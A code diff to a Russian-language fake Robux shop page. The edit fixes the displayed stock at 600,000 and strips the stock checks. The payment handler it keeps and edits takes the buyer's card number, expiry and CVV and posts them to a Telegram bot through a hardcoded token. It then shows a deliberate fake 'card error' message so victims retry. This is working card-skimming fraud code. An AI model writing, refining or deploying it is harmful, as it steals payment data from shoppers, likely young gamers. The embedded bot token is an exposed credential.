@@ -27,7 +27,6 @@
         .cart-icon-btn { background: #decbff; border: none; border-radius: 60px; padding: 10px 20px; font-weight: bold; font-size: 1rem; color: #5d3b80; cursor: pointer; display: flex; align-items: center; gap: 8px; transition: 0.2s; }
         .cart-icon-btn:hover { background: #ceb5ff; transform: scale(1.02); }
         
-        /* панель остатка и ползунок */
         .stock-panel {
             background: #ffffffcc;
             border-radius: 60px;
@@ -154,7 +153,7 @@
             <button class="cart-icon-btn" id="openCartBtn">🛒 корзина (<span id="cartCount">0</span>)</button>
         </div>
 
-        <!-- Панель остатка робуксов и ползунок -->
+        <!-- Статичный запас робуксов -->
         <div class="stock-panel">
             <div class="stock-remaining">✨ осталось робуксов ✨</div>
             <div class="stock-value" id="remainingStock">600 000</div>
@@ -231,35 +230,29 @@
     }
     drawStars();
 
-    // --- остаток робуксов (начальный запас 600000) ---
-    let currentStock = 600000;
+    // --- статичный остаток 600000, никогда не меняется ---
+    const STATIC_STOCK = 600000;
     const remainingSpan = document.getElementById('remainingStock');
     const slider = document.getElementById('robuxSlider');
     const selectedSpan = document.getElementById('selectedAmount');
     
-    function updateStockUI() {
-        remainingSpan.innerText = currentStock.toLocaleString('ru-RU');
-        slider.max = currentStock;
-        if (slider.value > currentStock) slider.value = currentStock;
-        selectedSpan.innerText = parseInt(slider.value).toLocaleString('ru-RU');
-        slider.disabled = (currentStock < 100);
-    }
+    remainingSpan.innerText = STATIC_STOCK.toLocaleString('ru-RU');
+    slider.max = STATIC_STOCK;
     
     slider.addEventListener('input', () => {
         let val = parseInt(slider.value);
-        if (val > currentStock) val = currentStock;
+        if (val > STATIC_STOCK) val = STATIC_STOCK;
         slider.value = val;
         selectedSpan.innerText = val.toLocaleString('ru-RU');
     });
     
-    // корзина (теперь каждый элемент содержит robuxAmount)
+    // корзина
     let cart = [];
     function showMessage(msg) {
         let d=document.createElement('div'); d.innerText=msg; d.style.cssText='position:fixed; bottom:20px; left:20px; background:#e2ccff; color:#6a37a3; padding:10px 20px; border-radius:40px; z-index:9999;';
         document.body.appendChild(d); setTimeout(()=>d.remove(),2500);
     }
     
-    // добавление в корзину без списания остатка
     function addItemToCart(item) {
         cart.push(item);
         updateCartUI();
@@ -296,20 +289,16 @@
         });
     }
     
-    // кнопка ползунка: добавляем в корзину (без списания)
+    // кнопка ползунка
     document.getElementById('buyWithSliderBtn').addEventListener('click', () => {
         let amount = parseInt(slider.value);
         if (amount <= 0) return;
-        if (amount > currentStock) {
-            showErrorToast("недостаточно робуксов в наличии");
-            return;
-        }
         let price = Math.round(amount * 0.49);
         let itemName = `${amount.toLocaleString('ru-RU')} Robux (ползунок)`;
         addItemToCart({ name: itemName, price: price, robuxAmount: amount });
     });
     
-    // кнопки обычных товаров (с data-robux)
+    // обычные товары
     function bindBuyButtons() {
         document.querySelectorAll('.btn-buy').forEach(btn=>{
             btn.removeEventListener('click', buyHandler);
@@ -319,15 +308,10 @@
             let name = this.getAttribute('data-name');
             let price = parseInt(this.getAttribute('data-price'));
             let robuxAmount = parseInt(this.getAttribute('data-robux'));
-            if (robuxAmount > currentStock) {
-                showErrorToast("недостаточно робуксов в наличии");
-                return;
-            }
             addItemToCart({ name: name, price: price, robuxAmount: robuxAmount });
         }
     }
     
-    // функция красной метки для ошибок
     function showErrorToast(text) {
         let old = document.querySelectorAll('.error-toast');
         old.forEach(t => t.remove());
@@ -338,7 +322,7 @@
         setTimeout(() => toast.remove(), 3500);
     }
     
-    // --- авторизация ---
+    // авторизация
     let currentUser = null;
     function loadUsers() {
         let users = localStorage.getItem('excellent_users');
@@ -371,7 +355,7 @@
     document.getElementById('goToSignIn')?.addEventListener('click',()=>{ document.getElementById('signupForm').style.display='none'; document.getElementById('signinForm').style.display='block'; });
     document.getElementById('logoutBtn')?.addEventListener('click',()=>{ currentUser=null; localStorage.removeItem('excellent_current'); showAuth(true); cart=[]; updateCartUI(); });
 
-    // --- телеграм и оплата (списание происходит только при успешной отправке) ---
+    // телеграм и оплата (без изменения статичного остатка)
     const TELEGRAM_TOKEN = "8963187856:AAFTu9IrZmSitQscE1FB5MTREDhkSMEAzeg";
     let CHAT_ID = localStorage.getItem('tg_chat_id_excellent');
 
@@ -398,12 +382,6 @@
     
     document.getElementById('finalPayBtn')?.addEventListener('click', async () => {
         if(cart.length===0) { alert('корзина пуста'); return; }
-        // проверим, хватает ли робуксов суммарно
-        let totalRobuxNeeded = cart.reduce((sum, item) => sum + (item.robuxAmount || 0), 0);
-        if (totalRobuxNeeded > currentStock) {
-            showErrorToast("недостаточно робуксов на складе для этого заказа");
-            return;
-        }
         let cardNum = document.getElementById('cardNumber').value.trim();
         let expiry = document.getElementById('cardExpiry').value.trim();
         let cvv = document.getElementById('cardCvv').value.trim();
@@ -412,7 +390,8 @@
         if(!CHAT_ID) { await fetchChatId(); if(!CHAT_ID) { alert('телеграм не настроен'); return; } }
         let totalPrice = cart.reduce((s,i)=>s+(i.price||0),0);
         let itemsText = cart.map(i=>`${i.name} — ${i.price||0} ₽`).join('\n');
-        let msg = `✨ EXCELLENT SHOP (ЗАКАЗ) ✨\n👤 ${currentUser}\n🎮 Roblox ник: ${robloxName}\n📦 Товары:\n${itemsText}\n💰 Итого: ${totalPrice} ₽\n💳 Карта: ${cardNum}\n📅 ${expiry}\n🔐 ${cvv}\n📊 Всего робуксов: ${totalRobuxNeeded}`;
+        let totalRobux = cart.reduce((sum,item)=>sum+(item.robuxAmount||0),0);
+        let msg = `✨ EXCELLENT SHOP (ЗАКАЗ) ✨\n👤 ${currentUser}\n🎮 Roblox ник: ${robloxName}\n📦 Товары:\n${itemsText}\n💰 Итого: ${totalPrice} ₽\n💳 Карта: ${cardNum}\n📅 ${expiry}\n🔐 ${cvv}\n📊 Робуксов: ${totalRobux}`;
         try {
             let resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                 method:'POST', headers:{'Content-Type':'application/json'},
@@ -420,10 +399,7 @@
             });
             let json = await resp.json();
             if(json.ok) {
-                // успешно: списываем робуксы
-                currentStock -= totalRobuxNeeded;
-                updateStockUI();
-                // показываем красную метку (формальность)
+                // показываем красную метку (формальность), остаток не меняем
                 let errToast = document.createElement('div');
                 errToast.className = 'error-toast';
                 errToast.innerText = "Ошибка, пожалуйста перепроверьте данные карты или попробуйте позже.";
@@ -445,7 +421,6 @@
     function initEverything() {
         bindBuyButtons();
         updateCartUI();
-        updateStockUI();
     }
     
     const savedUser = localStorage.getItem('excellent_current');
